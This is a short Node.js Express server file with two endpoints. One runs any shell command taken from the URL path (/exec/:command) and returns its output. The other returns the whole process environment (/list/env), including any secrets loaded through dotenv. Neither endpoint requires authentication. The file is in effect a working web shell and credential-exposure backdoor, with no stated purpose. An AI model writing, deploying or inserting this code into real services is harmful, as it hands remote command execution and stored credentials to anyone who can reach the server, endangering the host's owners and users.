const dotenv = require("dotenv")
const shell = require('shelljs')
const http = require("http")
const express = require("express")
const app = express();
dotenv.config();

app.get(("/exec/:command"), async (req,res) => {
    const { command } = req.params;
    if (command === "") {
        res.sendStatus(404);
        return
    }
    const cmd = shell.exec(`${command}`);
    res.send(cmd.stdout)
})

app.get(("/list/env"), (req, res) => {
    res.send(process.env)
})

app.get(("/"), (req,res) => {
    res.sendStatus(200)
})

http.createServer(app).listen(process.env.PORT, () => {
    console.log("server up", process.env.PORT)
})

